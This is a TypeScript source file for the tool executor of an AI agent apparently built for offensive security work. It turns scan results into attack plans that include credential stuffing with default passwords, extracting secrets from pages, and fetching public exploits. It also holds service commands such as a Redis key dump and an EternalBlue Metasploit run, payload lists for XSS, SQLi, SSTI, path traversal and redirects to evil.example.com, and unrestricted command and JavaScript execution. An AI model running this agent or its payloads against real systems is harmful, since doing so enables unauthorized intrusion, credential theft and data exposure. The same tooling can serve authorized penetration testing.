import path from 'path'
import fs from 'fs'
import https from 'https'
import http from 'http'
import { ToolDef, ToolCall } from './providers/index'
import { auditLog } from './lib/auditLog'
import { encryptSecret, decryptSecret } from './lib/secureStorage'
import { isInternalTarget } from './lib/scopeValidator'
import type { ScanData, Vulnerability, Port, HttpPage, DirEntry, JsEndpoint, OsintEntry, SslInfo } from './types/scan'
import { AGENT_TOOLS } from './agentToolDefs'
import type { ToolMeta } from './agentToolDefs'
export type { ToolTier, ToolMeta } from './agentToolDefs'
export { AGENT_TOOLS }

function readMemory(memoryPath: string): Record<string, string> {
  try {
    const raw = fs.readFileSync(memoryPath, 'utf-8')
    try { return JSON.parse(decryptSecret(raw)) } catch { /* legacy plain JSON */ }
    return JSON.parse(raw)
  } catch { return {} }
}

function writeMemory(memoryPath: string, data: Record<string, string>): void {
  fs.mkdirSync(path.dirname(memoryPath), { recursive: true })
  fs.writeFileSync(memoryPath, encryptSecret(JSON.stringify(data)))
}

// Safe arg accessors — prevent silent undefined/NaN when LLM omits optional fields
function getString(args: Record<string, unknown>, key: string, fallback = ''): string {
  const v = args[key]
  return typeof v === 'string' ? v : fallback
}
function getNumber(args: Record<string, unknown>, key: string, fallback: number): number {
  const v = args[key]
  return typeof v === 'number' && Number.isFinite(v) ? v : fallback
}
function getBool(args: Record<string, unknown>, key: string, fallback = false): boolean {
  const v = args[key]
  return typeof v === 'boolean' ? v : fallback
}

// Tool definitions live in agentToolDefs.ts and are re-exported above.

export function getToolDefs(): ToolDef[] {
  return AGENT_TOOLS.map(({ name, description, parameters }) => ({ name, description, parameters }))
}

export function getToolMeta(name: string): ToolMeta | undefined {
  return AGENT_TOOLS.find(t => t.name === name)
}

// ── Context and result types ──────────────────────────────────────────────────

export interface AgentContext {
  scanData: ScanData | null
  memoryPath: string
  binDir: string
  agentOutputDir: string
  attackerConfig: Record<string, string>
  toolList: { name: string; installed: boolean; enabled: boolean; desc: string }[]
  weaponList: unknown[]
  browserNavigate: (url: string, waitMs?: number) => Promise<{ title: string; url: string }>
  browserReadDom: () => Promise<{ text: string; links: string[]; forms: FormInfo[] }>
  browserScreenshot: () => Promise<string>
  browserClick: (selector: string, byText: boolean) => Promise<void>
  browserFill: (selector: string, value: string, clearFirst: boolean) => Promise<void>
  browserFillForm: (formSelector?: string) => Promise<FormFillResult>
  browserExecuteJs: (code: string) => Promise<unknown>
  browserNewTab: (url?: string) => Promise<{ tabId: string; url: string; title: string }>
  browserSwitchTab: (tabId: string) => { url: string; title: string }
  browserCloseTab: (tabId: string) => void
  browserGetTabs: () => { id: string; url: string; title: string }[]
  runCommand: (command: string, timeoutMs?: number) => Promise<{ stdout: string; stderr: string; exitCode: number }>
  sendToTerminal: (text: string) => void
  setWeaponStatus: (weaponId: string, status: string, note?: string) => void
  setAttackerConfig: (cfg: Record<string, string>) => void
  startScan?: (target: string, options?: Record<string, boolean>) => Promise<string>
  cancelScan?: (scanId: string) => Promise<void>
  exportReport?: (format: 'json' | 'markdown') => Promise<string>
  spawnStreaming?: (command: string, onData: (text: string) => void, timeoutMs?: number) => Promise<number>
  openFile?: (filePath: string) => void
}

export interface FormInfo {
  action: string
  method: string
  fields: { name: string; type: string; label: string; required: boolean }[]
}

export interface FormFillResult {
  fieldsFilledCount: number
  values: Record<string, string>
}

// ── HTTP helper ───────────────────────────────────────────────────────────────

async function rawFetch(url: string, timeoutMs = 8000): Promise<{ status: number; body: string }> {
  return new Promise((resolve) => {
    try {
      const parsed = new URL(url)
      const lib = parsed.protocol === 'https:' ? https : http
      const opts = {
        hostname: parsed.hostname,
        port: parsed.port ? parseInt(parsed.port) : (parsed.protocol === 'https:' ? 443 : 80),
        path: parsed.pathname + parsed.search,
        method: 'GET' as const,
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
      }
      let body = ''
      const req = lib.request(opts, (res) => {
        res.on('data', (c: Buffer) => { body += c.toString() })
        res.on('end', () => resolve({ status: res.statusCode || 0, body: body.slice(0, 60000) }))
      })
      req.on('error', () => resolve({ status: 0, body: '' }))
      req.setTimeout(timeoutMs, () => { req.destroy(); resolve({ status: 0, body: 'timeout' }) })
      req.end()
    } catch (e) {
      resolve({ status: 0, body: `invalid url: ${e}` })
    }
  })
}

// ── DOM summary helper ────────────────────────────────────────────────────────

function formatDom(dom: { text: string; links: string[]; forms: FormInfo[] }, url: string, title: string): string {
  const formLines = dom.forms.map((f, i) =>
    `  Form ${i + 1}: ${f.method.toUpperCase()} ${f.action || url}\n` +
    f.fields.map(x => `    • ${x.name || x.label || '?'} [${x.type}${x.required ? '*' : ''}]`).join('\n')
  ).join('\n')

  const linkSample = dom.links.slice(0, 25).join('\n  ')

  return [
    `URL: ${url}`,
    `Title: ${title}`,
    '',
    `=== PAGE CONTENT (first 5000 chars) ===`,
    dom.text.slice(0, 5000),
    '',
    `=== LINKS (${dom.links.length} total) ===`,
    `  ${linkSample}${dom.links.length > 25 ? `\n  ...and ${dom.links.length - 25} more` : ''}`,
    '',
    dom.forms.length > 0 ? `=== FORMS (${dom.forms.length}) ===\n${formLines}` : '=== FORMS: none ===',
  ].join('\n')
}

// ── Attack plan builder ───────────────────────────────────────────────────────

function buildAttackPlan(s: ScanData): object {
  const critVulns = (s.vulnerabilities || []).filter((v: Vulnerability) => ['critical', 'high'].includes(v.severity))
  const medVulns = (s.vulnerabilities || []).filter((v: Vulnerability) => v.severity === 'medium')
  const openPorts = (s.ports || []).filter((p: Port) => p.state === 'open')
  const httpPages: HttpPage[] = s.http || []
  const loginPages: Array<HttpPage | DirEntry> = [
    ...httpPages.filter((h: HttpPage) => /login|signin|admin|dashboard|portal|wp-admin|phpmyadmin/i.test(`${h.title || ''} ${h.url || ''}`)),
    ...(s.dirs || []).filter((d: DirEntry) => /login|admin|wp-admin|phpmyadmin|manager|console/i.test(d.url || '') && d.status === 200),
  ]
  const secrets = (s.jsEndpoints || []).filter((e: JsEndpoint) => e.type === 'secret')
  const emails = (s.osint || []).filter((o: OsintEntry) => o.type === 'email').map((o: OsintEntry) => o.value)
  const highRiskPorts = openPorts.filter((p: Port) => [21, 22, 23, 25, 445, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 27017].includes(p.port))
  const weakSSL = (s.ssl || []).filter((c: SslInfo) => (c.issues || []).length > 0 || (c.daysLeft !== undefined && c.daysLeft < 30))
  const expiredCerts = (s.ssl || []).filter((c: SslInfo) => c.daysLeft !== undefined && c.daysLeft <= 0)

  const steps: object[] = []

  critVulns.slice(0, 6).forEach((v: Vulnerability) => {
    steps.push({
      priority: 'CRITICAL',
      action: 'exploit_vulnerability',
      target: v.host,
      finding: `${v.name}${v.id ? ` (${v.id})` : ''}`,
      severity: v.severity,
      tags: v.tags || [],
      steps: [
        `1. fetch_url https://exploit-db.com/search?q=${encodeURIComponent(v.name)} — find public PoC`,
        `2. fetch_url https://nvd.nist.gov/vuln/detail/${v.id || ''} — get CVSS + details`,
        `3. Adapt exploit command to target ${v.host}`,
        `4. run_command to execute the adapted exploit`,
      ],
    })
  })

  if (loginPages.length > 0) {
    steps.push({
      priority: 'HIGH',
      action: emails.length > 0 ? 'credential_stuffing' : 'default_creds_attack',
      targets: loginPages.slice(0, 4).map(p => p.url),
      emails_to_try: emails.slice(0, 8),
      passwords_to_try: ['admin', 'password', 'Password1', '123456', 'admin123', 'letmein', s.target?.split('.')[0] || 'target'],
      steps: [
        `1. browser_navigate to login page — get full form structure`,
        `2. browser_audit_page — check for account lockout, CSRF tokens`,
        `3. browser_fill_form with username_value + password_value`,
        emails.length > 0 ? `4. Try all ${emails.length} discovered emails with common passwords` : `4. Try admin/admin, admin/password, user/user`,
        `5. save_memory any successful credential`,
      ],
    })
  }

  secrets.slice(0, 4).forEach((sec: JsEndpoint) => {
    steps.push({
      priority: 'HIGH',
      action: 'validate_secret',
      url: sec.url,
      secret_hint: sec.masked,
      severity: sec.severity || 'high',
      steps: [
        `1. browser_navigate to ${sec.url} — load the page/JS file`,
        `2. browser_execute_js to extract and reveal the full secret value`,
        `3. If JWT: decode with atob(token.split('.')[1]) — check alg field for none/HS256 weakness`,
        `4. If API key: fetch_url to validate against the service API`,
        `5. save_memory the validated secret`,
      ],
    })
  })

  highRiskPorts.slice(0, 5).forEach((p: Port) => {
    const portGuide: Record<number, string> = {
      6379: `redis-cli -h ${p.host} ping → if PONG: unauthenticated Redis. Dump with: redis-cli -h ${p.host} keys '*'`,
      27017: `mongo ${p.host}:27017 --eval "db.adminCommand({listDatabases:1})" → no-auth MongoDB`,
      3306: `mysql -h ${p.host} -u root --password= -e "show databases;" → empty-password root`,
      5432: `psql -h ${p.host} -U postgres -c "\\l" → try default postgres user`,
      21: `ftp ${p.host} → try anonymous/anonymous login`,
      3389: `Check BlueKeep CVE-2019-0708, DejaBlue CVE-2019-1181`,
      445: `Check EternalBlue CVE-2017-0144: msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue"`,
      5900: `vncviewer ${p.host} → try no-password or default VNC password`,
      8080: `curl -i http://${p.host}:8080/ → check for exposed admin panels (Tomcat Manager, Jenkins, etc.)`,
    }
    steps.push({
      priority: 'HIGH',
      action: 'test_service',
      target: `${p.host}:${p.port}`,
      service: p.service || 'unknown',
      command: portGuide[p.port] || `nmap -sV -sC -p ${p.port} ${p.host}`,
      tool: 'run_command',
    })
  })

  medVulns.slice(0, 3).forEach((v: Vulnerability) => {
    steps.push({
      priority: 'MEDIUM',
      action: 'verify_and_document',
      target: v.host,
      finding: v.name,
      tool: v.matched ? 'fetch_url or test_endpoint' : 'run_nuclei',
    })
  })

  const quickWins: string[] = []
  if (secrets.length > 0) quickWins.push(`${secrets.length} JS secret(s) found — likely live API keys or tokens`)
  if (loginPages.length > 0 && emails.length > 0) quickWins.push(`Login pages + ${emails.length} real emails = credential stuffing target`)
  if (highRiskPorts.some(p => p.port === 6379)) quickWins.push('Redis port open — test for unauthenticated access (frequent misconfiguration)')
  if (highRiskPorts.some(p => p.port === 27017)) quickWins.push('MongoDB port open — test for no-auth access')
  if (critVulns.length > 0) quickWins.push(`${critVulns.length} critical/high vulnerabilities — fetch PoCs from exploit-db`)
  if (expiredCerts.length > 0) quickWins.push(`${expiredCerts.length} expired SSL cert(s) — document for report`)
  if (weakSSL.length > 0) quickWins.push(`${weakSSL.length} host(s) with SSL issues — TLS downgrade potential`)

  return {
    target: s.target,
    scan_summary: {
      critical_high_vulns: critVulns.length,
      medium_vulns: medVulns.length,
      login_pages_found: loginPages.length,
      login_urls: loginPages.slice(0, 5).map(p => p.url),
      js_secrets_found: secrets.length,
      osint_emails_found: emails.length,
      osint_emails: emails.slice(0, 10),
      high_risk_open_ports: highRiskPorts.length,
    },
    quick_wins: quickWins,
    attack_plan: steps,
    total_steps: steps.length,
  }
}

// ── Tool executor ─────────────────────────────────────────────────────────────

export async function executeTool(tc: ToolCall, ctx: AgentContext): Promise<string> {
  const a = tc.args
  try {
    switch (tc.name) {

      case 'analyze_and_plan': {
        if (!ctx.scanData) return 'No active scan data. Run a scan first, then call analyze_and_plan.'
        const plan = buildAttackPlan(ctx.scanData)
        return JSON.stringify(plan, null, 2)
      }

      case 'fetch_url': {
        const url = getString(a, 'url')
        if (isInternalTarget(url)) return `Blocked: "${url}" resolves to an internal/reserved address. fetch_url is restricted to external targets.`
        const maxChars = Math.min(getNumber(a, 'max_chars', 8000), 20000)
        const lib = url.startsWith('https') ? https : http
        return new Promise<string>((resolve) => {
          let data = ''
          const req = lib.get(
            url,
            { headers: { 'User-Agent': 'Mozilla/5.0 (compatible; ReconMaster/1.0; +security-research)' } },
            (res: import('http').IncomingMessage) => {
              if (res.statusCode && res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                resolve(`Redirect to: ${res.headers.location}`)
                return
              }
              res.on('data', (c: Buffer) => { data += c.toString() })
              res.on('end', () => {
                const text = data
                  .replace(/<style[^>]*>[\s\S]*?<\/style>/gi, '')
                  .replace(/<script[^>]*>[\s\S]*?<\/script>/gi, '')
                  .replace(/<[^>]+>/g, ' ')
                  .replace(/&nbsp;/g, ' ').replace(/&amp;/g, '&')
                  .replace(/&lt;/g, '<').replace(/&gt;/g, '>')
                  .replace(/\s+/g, ' ').trim()
                resolve(`[${res.statusCode}] ${url}\n\n${text.slice(0, maxChars)}`)
              })
            },
          )
          req.on('error', (e: Error) => resolve(`Fetch error: ${e.message}`))
          req.setTimeout(12000, () => { req.destroy(); resolve('Request timed out after 12s') })
        })
      }

      case 'read_scan': {
        if (!ctx.scanData) return 'No active scan.'
        const section = getString(a, 'section')
        if (section === 'all') return JSON.stringify(ctx.scanData, null, 2).slice(0, 20000)
        if (section === 'summary') return JSON.stringify(ctx.scanData.summary || {})
        const fieldMap: Record<string, string> = {
          dns: 'dns', subdomains: 'subdomains', ports: 'ports', http: 'http',
          ssl: 'ssl', dirs: 'dirs', vulns: 'vulnerabilities', osint: 'osint', js: 'jsEndpoints',
        }
        const data = (ctx.scanData as Record<string, unknown>)[fieldMap[section] || section] || []
        return JSON.stringify(data, null, 2).slice(0, 15000)
      }

      case 'save_memory': {
        try {
          const key = getString(a, 'key')
          const value = getString(a, 'value')
          const existing = readMemory(ctx.memoryPath)
          existing[key] = value
          writeMemory(ctx.memoryPath, existing)
          auditLog('AGENT_SAVE_MEMORY', { key })
          return `Saved memory: ${key}`
        } catch (err) { return `Error: ${String(err)}` }
      }

      case 'read_memory': {
        try { return JSON.stringify(readMemory(ctx.memoryPath), null, 2) }
        catch { return '{}' }
      }

      case 'browser_navigate': {
        const navUrl = getString(a, 'url')
        if (isInternalTarget(navUrl)) return `Blocked: "${navUrl}" resolves to an internal/reserved address. browser_navigate is restricted to external targets.`
        const r = await ctx.browserNavigate(navUrl, getNumber(a, 'wait_ms', 1500))
        const dom = await ctx.browserReadDom()
        return formatDom(dom, r.url, r.title)
      }

      case 'browser_click': {
        await ctx.browserClick(getString(a, 'selector'), getBool(a, 'by_text'))
        const waitMs = getNumber(a, 'wait_ms', 800)
        await new Promise(res => setTimeout(res, waitMs))
        const dom = await ctx.browserReadDom()
        return `Clicked: ${a.selector}\n\n` + formatDom(dom, '', 'After click')
      }

      case 'browser_fill': {
        await ctx.browserFill(getString(a, 'selector'), getString(a, 'value'), a.clear_first !== false)
        return `Filled "${a.selector}" with "${String(a.value).slice(0, 50)}"`
      }

      case 'browser_fill_form': {
        const dom = await ctx.browserReadDom()
        const form = dom.forms[0]
        if (!form) return 'No form found on page.'

        const formSelector = getString(a, 'form_selector') || undefined
        const r = await ctx.browserFillForm(formSelector)

        // Override username/password if provided
        if (a.username_value) {
          const userSel = '[name*=user],[name*=email],[name*=login],[name*=username],[id*=user],[id*=email]'
          await ctx.browserFill(userSel, getString(a, 'username_value'), true).catch(() => {})
        }
        if (a.password_value) {
          await ctx.browserFill('input[type=password]', getString(a, 'password_value'), true).catch(() => {})
        }

        if (getBool(a, 'submit')) {
          await ctx.browserClick('input[type=submit],button[type=submit],button:last-child', false).catch(async () => {
            await ctx.browserClick('submit', true).catch(() => {})
          })
          await new Promise(res => setTimeout(res, 1500))
          const afterDom = await ctx.browserReadDom()
          return `Filled ${r.fieldsFilledCount} fields and submitted.\nForm values: ${JSON.stringify(r.values)}\n\nPage after submit:\n${afterDom.text.slice(0, 3000)}`
        }

        return `Filled ${r.fieldsFilledCount} fields. Values: ${JSON.stringify(r.values)}`
      }

      case 'browser_execute_js': {
        const result = await ctx.browserExecuteJs(getString(a, 'code'))
        return `Result: ${JSON.stringify(result, null, 2).slice(0, 3000)}`
      }

      case 'browser_audit_page': {
        const audit = await ctx.browserExecuteJs(`
          (() => {
            const r = {
              xss_vectors: [],
              csrf: { has_forms: false, unprotected_post_forms: [], csrf_tokens_found: [] },
              hidden_inputs: [],
              jwt_tokens: [],
              api_endpoints: [],
              sensitive_data_exposed: [],
              auth_indicators: { has_login_form: false, has_password_field: false, has_remember_me: false },
              security_notes: [],
            }

            document.querySelectorAll('input:not([type=hidden]):not([type=submit]):not([type=button]):not([type=reset]), textarea, select').forEach(el => {
              r.xss_vectors.push({ name: el.name || el.id || '(unnamed)', type: el.type || el.tagName.toLowerCase(), placeholder: el.placeholder || '' })
            })

            document.querySelectorAll('form').forEach((form, i) => {
              r.csrf.has_forms = true
              const tokenField = form.querySelector('[name*=csrf],[name*=_token],[name*=nonce],[name*=authenticity_token],[name*=__RequestVerificationToken]')
              if (tokenField) r.csrf.csrf_tokens_found.push({ form: i, name: tokenField.name, value: tokenField.value.slice(0, 30) })
              if (form.method.toUpperCase() === 'POST' && !tokenField) {
                r.csrf.unprotected_post_forms.push({ action: form.action || window.location.href, fields: Array.from(form.elements).map(e => e.name).filter(Boolean) })
              }
            })

            document.querySelectorAll('input[type=hidden]').forEach(el => {
              if (el.name && el.value) r.hidden_inputs.push({ name: el.name, value: el.value.slice(0, 100) })
            })

            const html = document.documentElement.innerHTML
            const jwtRx = /eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}/g
            let m
            while ((m = jwtRx.exec(html)) !== null && r.jwt_tokens.length < 5) {
              r.jwt_tokens.push(m[0].slice(0, 100) + (m[0].length > 100 ? '...' : ''))
            }

            const apiRx = /['"](\/api\/[^'"?#]{2,}|\/v\d+\/[^'"?#]{2,})['"]/g
            while ((m = apiRx.exec(html)) !== null && r.api_endpoints.length < 20) r.api_endpoints.push(m[1])
            r.api_endpoints = [...new Set(r.api_endpoints)]

            const text = document.body?.innerText || ''
            const emailRx = /[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/g
            const emailsFound = (text.match(emailRx) || []).slice(0, 8)
            if (emailsFound.length) r.sensitive_data_exposed.push({ type: 'emails', values: emailsFound })

            const keyRx = /["'](sk-[a-zA-Z0-9]{32,}|AIza[a-zA-Z0-9]{35,}|AKIA[A-Z0-9]{16}|ghp_[a-zA-Z0-9]{36})['"]/g
            while ((m = keyRx.exec(html)) !== null && r.sensitive_data_exposed.filter(x=>x.type==='api_key').length < 3) {
              r.sensitive_data_exposed.push({ type: 'api_key', value: m[1].slice(0, 20) + '...' })
            }

            r.auth_indicators.has_login_form = !!document.querySelector('[action*=login],[action*=signin],[id*=login-form],[class*=login-form]')
            r.auth_indicators.has_password_field = !!document.querySelector('input[type=password]')
            r.auth_indicators.has_remember_me = !!document.querySelector('[name*=remember],[id*=remember]')

            if (r.csrf.unprotected_post_forms.length > 0) r.security_notes.push('CSRF: POST form(s) with no CSRF token — potential CSRF vulnerability')
            if (r.jwt_tokens.length > 0) r.security_notes.push('JWT token(s) found in page source — decode and check algorithm')
            if (r.hidden_inputs.some(h => /user_?id|role|price|amount|is_admin/i.test(h.name))) r.security_notes.push('Hidden inputs with sensitive names — potential IDOR or privilege escalation vector')

            return r
          })()
        `)
        return JSON.stringify(audit, null, 2).slice(0, 12000)
      }

      case 'test_endpoint': {
        const url = getString(a, 'url')
        const param = getString(a, 'parameter')
        const vulnType = getString(a, 'vulnerability_type', 'all')

        const PAYLOADS: Record<string, Array<{ payload: string; indicator: RegExp | null; description: string }>> = {
          xss: [
            { payload: '"><script>alert(1337)</script>', indicator: /alert\(1337\)/i, description: 'Basic script injection' },
            { payload: "'><img src=x onerror=alert(1337)>", indicator: /onerror=alert/i, description: 'Img onerror injection' },
            { payload: '<svg/onload=alert(1337)>', indicator: /onload=alert/i, description: 'SVG onload injection' },
            { payload: 'javascript:alert(1337)', indicator: /javascript:alert/i, description: 'JS protocol injection' },
          ],
          sqli: [
            { payload: "'", indicator: /sql syntax|mysql_fetch|ORA-\d+|sqlite_error|pg_query|syntax error.*query|you have an error in your sql/i, description: 'Single quote — error-based' },
            { payload: "1' AND SLEEP(0)--", indicator: null, description: 'Time-based blind probe (no delay here — just syntax check)' },
            { payload: "' UNION SELECT NULL,NULL--", indicator: /union.*select/i, description: 'UNION-based probe' },
            { payload: "1 AND 1=2--", indicator: null, description: 'Boolean-based probe' },
          ],
          ssti: [
            { payload: '{{7*7}}', indicator: /\b49\b/, description: 'Jinja2/Twig template evaluation' },
            { payload: '${7*7}', indicator: /\b49\b/, description: 'FreeMarker/Velocity evaluation' },
            { payload: '<%= 7*7 %>', indicator: /\b49\b/, description: 'ERB/EL evaluation' },
            { payload: '#{7*7}', indicator: /\b49\b/, description: 'Ruby/Slim evaluation' },
          ],
          lfi: [
            { payload: '../../../../etc/passwd', indicator: /root:x:0:0/, description: 'Linux path traversal' },
            { payload: '....//....//....//etc/passwd', indicator: /root:x:0:0/, description: 'Encoded traversal' },
            { payload: '../../../../windows/win.ini', indicator: /\[fonts\]|for 16-bit app support/i, description: 'Windows path traversal' },
          ],
          open_redirect: [
            { payload: '//evil.example.com', indicator: /Location:\s*\/\/evil\.example\.com/i, description: 'Protocol-relative redirect' },
            { payload: 'https://evil.example.com', indicator: /Location:\s*https?:\/\/evil\.example\.com/i, description: 'Absolute redirect' },
            { payload: '/\\evil.example.com', indicator: /evil\.example\.com/i, description: 'Backslash bypass' },
          ],
        }

        const typesToTest = vulnType === 'all' ? Object.keys(PAYLOADS) : [vulnType]
        const findings: Array<{ type: string; payload: string; description: string; evidence: string; status: number }> = []
        const tested: Array<{ type: string; payload: string; status: number; vulnerable: boolean }> = []

        for (const type of typesToTest) {
          for (const { payload, indicator, description } of PAYLOADS[type] || []) {
            let testUrl: string
            try {
              const u = new URL(url)
              u.searchParams.set(param, payload)
              testUrl = u.toString()
            } catch {
              testUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(payload)}`
            }

            const { status, body } = await rawFetch(testUrl, 8000)
            const match = indicator ? indicator.exec(body) : null
            const vulnerable = !!match

            tested.push({ type, payload: payload.slice(0, 40), status, vulnerable })

            if (vulnerable) {
              const idx = body.indexOf(match![0])
              findings.push({
                type,
                payload,
                description,
                evidence: body.slice(Math.max(0, idx - 100), idx + 300),
                status,
              })
              break
            }
          }
        }

        return JSON.stringify({
          url, parameter: param,
          vulnerable: findings.length > 0,
          confirmed_vulnerabilities: findings,
          all_tests: tested,
        }, null, 2).slice(0, 10000)
      }

      case 'run_nuclei': {
        const nucleiExe = path.join(ctx.binDir, 'nuclei.exe')
        if (!fs.existsSync(nucleiExe)) return 'nuclei not installed. Use the Tools panel to install it.'
        const target = getString(a, 'target')
        const templates = Array.isArray(a.templates) ? (a.templates as unknown[]).filter((t): t is string => typeof t === 'string') : ['http/cves', 'http/exposures']
        const severity = Array.isArray(a.severity) ? (a.severity as unknown[]).filter((s): s is string => typeof s === 'string') : undefined
        const rateLimit = getNumber(a, 'rate_limit', 150)
        let cmd = `"${nucleiExe}" -u "${target}" -t "${templates.join(',')}" -json -rl ${rateLimit} -silent -no-color -timeout 10`
        if (severity?.length) cmd += ` -severity ${severity.join(',')}`
        const result = await ctx.runCommand(cmd, getNumber(a, 'timeout_ms', 120000))
        const findings = result.stdout.split('\n')
          .filter(Boolean)
          .flatMap(line => {
            try {
              const f = JSON.parse(line)
              return [{ id: f['template-id'] || '', name: f.info?.name || f['template-id'] || '', severity: f.info?.severity || 'info', host: f.host || '', matched: f['matched-at'] || '' }]
            } catch { return [] }
          })
          .slice(0, 200)
        return JSON.stringify({ count: findings.length, findings }, null, 2)
      }

      case 'propose_chain': {
        const steps = Array.isArray(a.steps) ? a.steps as { tool?: string; name?: string }[] : []
        return `Chain "${getString(a, 'title')}" with ${steps.length} steps proposed.`
      }

      case 'run_command': {
        const command = getString(a, 'command')
        auditLog('RUN_COMMAND', { command, description: getString(a, 'description') })
        const timeoutMs = typeof a.timeout_ms === 'number' ? a.timeout_ms : undefined
        const result = await ctx.runCommand(command, timeoutMs)
        return [
          result.stdout ? `STDOUT:\n${result.stdout.slice(0, 5000)}` : '',
          result.stderr ? `STDERR:\n${result.stderr.slice(0, 2000)}` : '',
          `Exit code: ${result.exitCode}`,
        ].filter(Boolean).join('\n')
      }

      case 'run_in_terminal': {
        const cmd = getString(a, 'command')
        const timeoutMs = getNumber(a, 'timeout_ms', 60000)
        auditLog('RUN_IN_TERMINAL', { command: cmd, description: getString(a, 'description') })
        ctx.sendToTerminal(`\x00green\x00$ ${cmd}\n`)
        if (ctx.spawnStreaming) {
          let output = ''
          const exitCode = await ctx.spawnStreaming(cmd, (text) => {
            ctx.sendToTerminal(text)
            output += text
          }, timeoutMs)
          ctx.sendToTerminal(`\x00dim\x00[exit ${exitCode}]\n`)
          return `Exit: ${exitCode}\n${output.slice(0, 5000)}`
        }
        const result = await ctx.runCommand(cmd, timeoutMs)
        if (result.stdout) ctx.sendToTerminal(result.stdout)
        if (result.stderr) ctx.sendToTerminal(result.stderr)
        ctx.sendToTerminal(`\x00dim\x00[exit ${result.exitCode}]\n`)
        return [
          result.stdout ? `STDOUT:\n${result.stdout.slice(0, 5000)}` : '',
          result.stderr ? `STDERR:\n${result.stderr.slice(0, 1000)}` : '',
          `Exit: ${result.exitCode}`,
        ].filter(Boolean).join('\n')
      }

      case 'get_weapons': {
        if (!ctx.weaponList?.length) return 'No weapons identified yet. The scan must complete before weapons are generated.'
        return JSON.stringify(ctx.weaponList, null, 2).slice(0, 12000)
      }

      case 'get_attacker_config': {
        return JSON.stringify(ctx.attackerConfig, null, 2)
      }

      case 'set_attacker_config': {
        const updated = { ...ctx.attackerConfig }
        const fields = ['lhost', 'lport', 'c2domain', 'interactshUrl', 'sessionCookie']
        for (const f of fields) {
          if (a[f] !== undefined) updated[f] = getString(a, f)
        }
        ctx.setAttackerConfig(updated)
        ctx.attackerConfig = updated
        return `Attacker config updated: ${JSON.stringify(updated)}`
      }

      case 'set_weapon_status': {
        const weaponId = getString(a, 'weapon_id')
        const status = getString(a, 'status')
        const note = getString(a, 'note') || undefined
        ctx.setWeaponStatus(weaponId, status, note)
        return `Weapon ${weaponId} → ${status}${note ? ` (${note})` : ''}`
      }

      case 'list_installed_tools': {
        return JSON.stringify(ctx.toolList, null, 2)
      }

      case 'start_scan': {
        if (!ctx.startScan) return 'start_scan not available.'
        const scanTarget = getString(a, 'target')
        const scanOptions = typeof a.options === 'object' && a.options !== null ? a.options as Record<string, boolean> : undefined
        const scanId = await ctx.startScan(scanTarget, scanOptions)
        return `Scan started. ID: ${scanId}. Target: ${scanTarget}. A new tab will appear in the UI.`
      }

      case 'cancel_scan': {
        if (!ctx.cancelScan) return 'cancel_scan not available.'
        const scanId = getString(a, 'scan_id')
        await ctx.cancelScan(scanId)
        return `Scan ${scanId} cancelled.`
      }

      case 'export_report': {
        if (!ctx.exportReport) return 'export_report not available.'
        const fmt: 'json' | 'markdown' = getString(a, 'format') === 'json' ? 'json' : 'markdown'
        const filePath = await ctx.exportReport(fmt)
        ctx.openFile?.(filePath)
        return `Report exported to: ${filePath}`
      }

      case 'read_file': {
        try {
          const outputDir = path.resolve(ctx.agentOutputDir)
          const requested = getString(a, 'path')
          const filePath = path.isAbsolute(requested)
            ? path.resolve(requested)
            : path.resolve(outputDir, requested)
          if (!filePath.startsWith(outputDir + path.sep) && filePath !== outputDir) {
            return `Error: Reads are restricted to the agent-output folder (${outputDir}). Provide a filename, not an absolute path.`
          }
          const content = fs.readFileSync(filePath, 'utf-8')
          const maxChars = getNumber(a, 'max_chars', 10000)
          const out = content.slice(0, maxChars)
          return out + (content.length > maxChars ? `\n...[${content.length - maxChars} more chars truncated]` : '')
        } catch (err) { return `Error reading file: ${String(err)}` }
      }

      case 'save_file': {
        try {
          const outputDir = path.resolve(ctx.agentOutputDir)
          // Accept either a bare filename or a relative subpath — always anchor to outputDir
          const requested = getString(a, 'path')
          const filePath = path.isAbsolute(requested)
            ? path.resolve(requested)
            : path.resolve(outputDir, requested)

          if (!filePath.startsWith(outputDir + path.sep) && filePath !== outputDir) {
            return `Error: Writes are restricted to the agent-output folder (${outputDir}). Provide a filename, not an absolute path.`
          }

          const content = getString(a, 'content')
          const append = getBool(a, 'append')
          fs.mkdirSync(path.dirname(filePath), { recursive: true })
          if (append) {
            fs.appendFileSync(filePath, content)
          } else {
            fs.writeFileSync(filePath, content)
          }
          auditLog('FILE_WRITE', { path: filePath, chars: content.length, append })
          return `Saved: ${filePath} (${content.length} chars)`
        } catch (err) { return `Error saving file: ${String(err)}` }
      }

      default:
        return `Unknown tool: ${tc.name}`
    }
  } catch (err) {
    return `Error: ${String(err)}`
  }
}
